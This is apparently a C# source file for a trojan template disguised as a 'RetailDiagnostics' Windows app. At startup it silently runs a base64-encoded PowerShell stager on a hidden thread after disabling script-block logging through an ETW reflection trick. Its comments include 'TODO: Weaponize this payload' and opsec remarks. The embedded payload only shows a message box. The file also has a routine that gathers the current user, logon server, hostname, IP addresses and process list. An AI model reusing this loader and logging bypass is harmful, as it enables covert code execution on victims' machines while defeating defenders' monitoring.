using System;
using System.Net;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Management;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Threading;

namespace RetailDiagnostics
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var t = new Thread(diagnostics);
            t.Start();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new RetailDiagnostics());
        }

        private static decimal getUptime()
        {
            TimeSpan uptime;
            using (var uptimePerfCounter = new PerformanceCounter("System", "System Up Time"))
            {
                uptimePerfCounter.NextValue();
                uptime = TimeSpan.FromSeconds(uptimePerfCounter.NextValue());
            }

            return (decimal)uptime.TotalHours;
        }

        private static decimal getPowerUsage()
        {
            const string wmiQuery = "SELECT CurrentVoltage FROM Win32_Processor";
            ManagementObjectSearcher wmiSearcher = new ManagementObjectSearcher(wmiQuery);
            ManagementObjectCollection wmiResults = wmiSearcher.Get();

            decimal currentVoltage = 0;
            foreach (var result in wmiResults)
            {
                currentVoltage += Convert.ToDecimal(result["CurrentVoltage"]);
            }

            currentVoltage = currentVoltage / wmiResults.Count;
            decimal powerUsage = (currentVoltage * currentVoltage) / 2300;

            return powerUsage;
        }

        private static string getRunningProcs()
        {
            Process[] runningProcs = Process.GetProcesses();
            string[] procList = new string[runningProcs.Length];
            for (int i = 0; i < runningProcs.Length; i++)
            {
                procList[i] = String.Format("Name: {0}; ID: {1}", runningProcs[i].ProcessName, runningProcs[i].Id);
            }

            string procListStr = string.Join(Environment.NewLine, procList);
            return procListStr;
        }

        private static string getIPAddrs()
        {
            IPHostEntry ipList = Dns.GetHostEntry(Dns.GetHostName());
            string[] addrList = new string[ipList.AddressList.Length];
            for (int i = 0; i < ipList.AddressList.Length; i++)
            {
                addrList[i] = string.Format("IP: {0}", ipList.AddressList[i]);
            }

            return string.Join(Environment.NewLine, addrList);

        }

        public static void runStats()
        {
            string hostname = Dns.GetHostName();

            string procList = getRunningProcs();
            string ipAddrList = getIPAddrs();

            string currentUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string logonServer = Environment.GetEnvironmentVariable("LOGONSERVER");

            decimal uptime = getUptime();
            decimal totalWattsUsed = getPowerUsage() * uptime;

            string[] lines = {
                "Total watts used: " + totalWattsUsed.ToString(),
                "Uptime: " + uptime.ToString(),
                "Current user: " + currentUser,
                "Logon server: " + logonServer,
                "Hostname: " + hostname,
                "IP Addrs: " + Environment.NewLine + ipAddrList,
                "Process List: " + Environment.NewLine + procList
            };

            string outfile = string.Format("{0}.txt", hostname);
            File.WriteAllLines(outfile, lines);

        }

        private static void diagnostics()
        {
            //TODO: Weaponize this payload
            //string stager = @"[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Hello from PowerShell!');";
            //stager = Convert.ToBase64String(Encoding.UTF8.GetBytes(stager));
            string stager = @"W1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgnU3lzdGVtLldpbmRvd3MuRm9ybXMnKTsgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCdIZWxsbyBmcm9tIFBvd2VyU2hlbGwhJyk7";
            var cmd = Encoding.UTF8.GetString(Convert.FromBase64String(stager));

            //Initialize PowerShell runspace with script block logging disabled
            var runspace = RunspaceFactory.CreateRunspace();
            var PSEtwLogProvider = runspace.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (PSEtwLogProvider == null)
            {
                //probably should exit here (fail closed) for opsec
                //return "";
            }
            else
            {
                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                EtwProvider.SetValue(null, EventProvider);
            }

            //this call must happen after the logging is disabled above
            runspace.Open();
            var scriptInvoker = new RunspaceInvoke(runspace);
            var pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            var results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            //var stringBuilder = new StringBuilder();
            //foreach (var obj in results)
            //{
            //    stringBuilder.Append(obj);
            //}
            //return stringBuilder.ToString().Trim();
        }
    }
}